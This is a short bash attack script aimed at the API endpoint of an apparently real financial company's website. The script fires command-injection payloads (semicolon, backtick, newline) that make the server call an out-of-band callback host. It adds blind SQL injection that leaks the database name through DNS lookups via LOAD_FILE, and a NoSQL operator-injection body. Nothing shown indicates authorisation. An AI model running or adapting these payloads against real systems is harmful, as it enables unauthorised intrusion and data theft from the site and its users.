#!/bin/bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
U="https://www.infinitycapital.bh/api/send"
CM="oobb51c9dbc23bb.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SQ="oob4b317635c5e6.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
POST() { curl -s -A "$UA" -X POST "$U" --data-urlencode "targets=probe@www.infinitycapital.bh" --data-urlencode "check=on" "$@"; }

echo "=== CMDI semicolon ==="
POST --data-urlencode "msg=x; curl http://$CM/cmdi1" | head -c 250; echo

echo "=== CMDI backtick ==="
POST --data-urlencode "msg=\`curl http://$CM/cmdi2\`" | head -c 250; echo

echo "=== CMDI pipe/newline ==="
POST --data-urlencode "msg=x
curl http://$CM/cmdi3" | head -c 250; echo

echo "=== Blind SQLi OOB DNS (fname) ==="
POST --data-urlencode "fname=ic'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\','$SQ/',(SELECT database()),'.txt')))||'" | head -c 300; echo

echo "=== Blind SQLi OOB DNS (targets) ==="
POST --data-urlencode "targets=probe@www.infinitycapital.bh'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\','$SQ/t2','.txt')))||'" | head -c 300; echo

echo "=== NoSQLi JSON body ==="
curl -s -A "$UA" -X POST "$U" -H "Content-Type: application/json" \
  --data '{"targets":"probe@www.infinitycapital.bh","fname":{"$ne":""},"msg":{"$gt":""},"check":"on"}' -w "\n[%{http_code}]\n" | head -c 350
